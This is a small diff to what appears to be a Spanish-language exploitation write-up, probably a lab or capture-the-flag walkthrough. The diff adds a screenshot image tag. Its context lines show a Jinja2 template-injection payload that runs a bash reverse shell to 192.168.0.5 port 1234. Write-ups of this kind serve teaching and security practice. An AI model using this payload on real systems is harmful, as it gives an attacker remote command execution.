@@ -50,6 +50,7 @@ Para ganar acceso interactivo al sistema, se envía un payload a través del par
 ```jinja2
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.0.5/1234 0>&1\'').read() }}
 ```
+<img width="1920" height="1008" alt="NC" src="https://github.com/user-attachments/assets/d595a161-afba-4532-a8a5-4c6778f41e4f" />
 
 ---
 
